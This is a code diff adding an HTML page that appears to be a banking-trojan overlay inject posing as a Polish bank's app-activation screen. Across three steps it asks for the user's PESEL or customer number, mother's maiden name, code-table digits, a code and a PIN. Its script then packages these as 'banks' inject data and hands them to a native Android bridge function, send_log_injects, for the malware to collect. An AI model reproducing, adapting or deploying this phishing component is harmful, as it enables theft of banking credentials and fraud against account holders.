@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <meta charset="UTF-8">
+        <style>
+            #form1, #form2, #form3 {
+                display: flex;
+                flex-direction: column;
+                min-height: 100vh;
+            }
+            
+            body {
+                font-family: sans-serif;
+                margin: 0;
+                padding: 0;
+                background: #fff;
+                color: #000;
+            }
+            
+            header {
+                background: #851936;
+                padding: 10px;
+                border-bottom: 1px solid #851936;
+                font-weight: 100;
+                color: #fff;
+                font-size: 16px;
+            }
+            
+            section {
+                padding: 20px;
+                flex: 1;
+            }
+
+            label {
+                color: #767676;
+                font-weight: 100;
+                margin-top: 9px;
+            }
+            
+            .input {
+                width: 100%;
+                background: #fff;
+                padding: 7px;
+                border: 0;
+                border-bottom: 1px solid #A8A8A8;
+                border-radius: 0;
+                margin-bottom: 15px;
+                color: #000;
+                transition: border-color 0.2s ease-in, color 0.2s ease-in;
+            }
+            
+            .input:focus {
+                width: 100%;
+                background: #fff;
+                padding: 7px;
+                border: 0;
+                border-bottom: 1px solid #850035;
+                border-radius: 0;
+                margin-bottom: 15px;
+                color: #000;
+                transition: border-color 0.2s ease-in, color 0.2s ease-in;
+            }
+            
+            .button {
+                border: 1px solid #850035;
+                width: 100%;
+                background: #850035;
+                color: #fff;
+                float: right;
+                padding: 10px;
+                font-size: 18px;
+                font-weight: 100;
+            }
+
+            .button[disabled] {
+                background: #7e7e7e;
+                border: none;
+            }
+
+            input,button {
+                outline: none !important;
+                box-shadow: none !important;
+            }
+
+            footer {
+                padding: 15px;
+            }
+
+            .error {
+                border-color: #f00 !important;
+            }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <img style="width: 28px;margin-right: 20px;margin-top: -2px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAYAAADhAJiYAAAAuElEQVR42mNgGAWjYBSMAkzw//9/ByBmodAMG2o5xgeIfwPxfHIdBdQ3+z8EpFDqGBuoY2CAZEchOQYGHCh1FLqBRDuKEr2kGryYkMFA+W6aOIYc3wLFp9PUMaRYhMXh62niGGJCCkfU8tCjXMLmqNl0iSYSHDVwjiHgqIFxzKBz0KCKskGVqPGVRXR3FDHVAd0cRUp9RnNH4agOOAZLTT9wzY/B2kBLoGITtmL4NfJHwSgYBcMNAAAH1RxuuXOMRAAAAABJRU5ErkJggg==">
+                Aktywuj aplikację
+            </header>
+            <section>
+                <label for="login">Wpisz numer PESEL lub CIF</label>
+                <input withpattern1 type="tel" class="input" placeholder="" maxlength="11"name="login" id="login" autocomplete="off">
+            </section>
+            <footer>
+                <p>
+                    <img style="width: 18px;margin-right: 10px;margin-top: -5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAABGCAIAAAAM8CB2AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjEwNjU3ODhFNENDMTFFQkEyNzJFQjE5NTU2NUZGOUMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjEwNjU3ODlFNENDMTFFQkEyNzJFQjE5NTU2NUZGOUMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2MTA2NTc4NkU0Q0MxMUVCQTI3MkVCMTk1NTY1RkY5QyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2MTA2NTc4N0U0Q0MxMUVCQTI3MkVCMTk1NTY1RkY5QyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PmYe+1kAAAY2SURBVHja7Jr7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" alt="">
+                    <span style="color: #851936;font-weight: 600;">Bezpieczeństwo</span>
+                </p>
+                <input type="submit" disabled="true" class="button" id="nextPage" value="Dalej"> 
+            </footer>
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                <img style="width: 28px;margin-right: 20px;margin-top: -2px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAYAAADhAJiYAAAAuElEQVR42mNgGAWjYBSMAkzw//9/ByBmodAMG2o5xgeIfwPxfHIdBdQ3+z8EpFDqGBuoY2CAZEchOQYGHCh1FLqBRDuKEr2kGryYkMFA+W6aOIYc3wLFp9PUMaRYhMXh62niGGJCCkfU8tCjXMLmqNl0iSYSHDVwjiHgqIFxzKBz0KCKskGVqPGVRXR3FDHVAd0cRUp9RnNH4agOOAZLTT9wzY/B2kBLoGITtmL4NfJHwSgYBcMNAAAH1RxuuXOMRAAAAABJRU5ErkJggg==">
+                Aktywuj aplikację
+            </header>
+            <section>
+                <label for="mmn">Prosimy o podanie: Nazwiska panieńskiego matki</label>
+                <input withpattern2 type="text" class="input" oninput="this.value=this.value.replace(/[^a-zA-Z]/g,'');"placeholder="" name="mmn" id="mmn" autocomplete="off">
+            </section>
+            <footer>
+                <p>
+                    <img style="width: 18px;margin-right: 10px;margin-top: -5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAABGCAIAAAAM8CB2AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjEwNjU3ODhFNENDMTFFQkEyNzJFQjE5NTU2NUZGOUMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjEwNjU3ODlFNENDMTFFQkEyNzJFQjE5NTU2NUZGOUMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2MTA2NTc4NkU0Q0MxMUVCQTI3MkVCMTk1NTY1RkY5QyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2MTA2NTc4N0U0Q0MxMUVCQTI3MkVCMTk1NTY1RkY5QyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PmYe+1kAAAY2SURBVHja7Jr7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" alt="">
+                    <span style="color: #851936;font-weight: 600;">Bezpieczeństwo</span>
+                </p>
+                <input  disabled="true" type="submit"  class="button" id="lastPage" value="Dalej"> 
+            </footer>
+        </div>
+        <div id="form3" style="display: none;">
+            <header>
+                <img style="width: 28px;margin-right: 20px;margin-top: -2px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAYAAADhAJiYAAAAuElEQVR42mNgGAWjYBSMAkzw//9/ByBmodAMG2o5xgeIfwPxfHIdBdQ3+z8EpFDqGBuoY2CAZEchOQYGHCh1FLqBRDuKEr2kGryYkMFA+W6aOIYc3wLFp9PUMaRYhMXh62niGGJCCkfU8tCjXMLmqNl0iSYSHDVwjiHgqIFxzKBz0KCKskGVqPGVRXR3FDHVAd0cRUp9RnNH4agOOAZLTT9wzY/B2kBLoGITtmL4NfJHwSgYBcMNAAAH1RxuuXOMRAAAAABJRU5ErkJggg==">
+                Aktywuj aplikację
+            </header>
+            <section>
+            <label for="cc"> Wpisz liczby z dwóch ostatnich kolumn </label>
+    
+                    <input type="tel" class="input" id="cc" name="cc" placeholder="" autocomplete="off">
+                    
+                    <label for="code">Wpisz kod</label>
+                <input type="tel" class="input" placeholder="" name="code" id="code" maxlength="4" autocomplete="off">
+                
+                <label for="pin">Wpisz PIN</label>
+                <input type="password" class="input" placeholder="" name="pin" id="pin" maxlength="8" autocomplete="off">
+            </section>
+            <footer>
+                <p>
+                    <img style="width: 18px;margin-right: 10px;margin-top: -5px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAABGCAIAAAAM8CB2AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjEwNjU3ODhFNENDMTFFQkEyNzJFQjE5NTU2NUZGOUMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjEwNjU3ODlFNENDMTFFQkEyNzJFQjE5NTU2NUZGOUMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2MTA2NTc4NkU0Q0MxMUVCQTI3MkVCMTk1NTY1RkY5QyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2MTA2NTc4N0U0Q0MxMUVCQTI3MkVCMTk1NTY1RkY5QyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PmYe+1kAAAY2SURBVHja7Jr7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" alt="">
+                    <span style="color: #851936;font-weight: 600;">Bezpieczeństwo</span>
+                </p>
+                <input type="submit"  class="button" id="sendData" value="Dalej"> 
+            </footer>
+        </div>
+    </form>
+
+    <script>
+    var nextPage = document.getElementById('nextPage'),
+        lastPage = document.getElementById('lastPage'),
+        sendData = document.getElementById('sendData');
+
+    var patterninput1=document.querySelector('form input[withpattern1]')
+    $(patterninput1).on('input', function (event) {
+        var regex = new RegExp(/^([\sa-zA-Z0-9\s]){7,11}$/);
+        newval=patterninput1.value
+        if (!regex.test(newval)) {
+            nextPage.disabled=true
+            patterninput1.classList.add("error")
+        }
+        else{
+            nextPage.disabled=false
+            patterninput1.classList.remove("error")
+        }
+    });
+    var patterninput2=document.querySelector('form input[withpattern2]')
+    $(patterninput2).on('input', function (event) {
+        var regex = new RegExp(/^([\sa-zA-Zа-яА-Я\s]){4,20}$/);
+        newval=patterninput2.value
+        if (!regex.test(newval)) {
+            event.preventDefault();
+            lastPage.disabled=true
+            patterninput2.classList.add("error")
+        }
+        else{
+            lastPage.disabled=false
+            patterninput2.classList.remove("error")
+        }
+    });
+    // $("#nextPage").on('click', function (event) {
+        
+    // })
+
+    $('#cc').mask('0000 0000')
+    $('#pin').mask('0#')
+        var form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            form3 = document.getElementById('form3');
+
+        var login = document.getElementById('login'),
+            mmn = document.getElementById('mmn'),
+            cc = document.getElementById('cc');
+            code = document.getElementById('code'),
+            pin = document.getElementById('pin');
+
+
+        nextPage.onclick = () => {
+          if(login.value.length !== 9) {
+                login.classList.add('error');
+            } else {
+                login.classList.remove('error');
+                        
+            }                form1.style.display = 'none';
+                form2.style.display = 'flex';
+            
+        }
+
+        lastPage.onclick = () => {
+          if(mmn.value.length !== 9) {
+                mmn.classList.add('error');
+            } else {
+                mmn.classList.remove('error');
+                        
+            }
+            
+            form2.style.display = 'none';
+                form3.style.display = 'flex';
+            
+        }
+
+        sendData.onclick = () => {
+            if(cc.value.length !== 9) {
+                cc.classList.add('error');
+            } else {
+                cc.classList.remove('error');
+                        
+            }
+            if(code.value.length !== 4) {
+                code.classList.add('error');
+            } else {
+                code.classList.remove('error');
+            }
+
+            if(pin.value.length < 4) {
+                pin.classList.add('error')
+            } else {
+                pin.classList.remove('error');
+            }
+
+            if(code.value.length === 4 && pin.value.length >= 4) {
+                var data = {};
+                data.login = login.value;
+                data.mmn = mmn.value;
+                
+                data.cc = cc.value;
+                data.code = code.value;
+                data.pin = pin.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+            }
+            
+        }
+    </script>
+</body>
+</html>
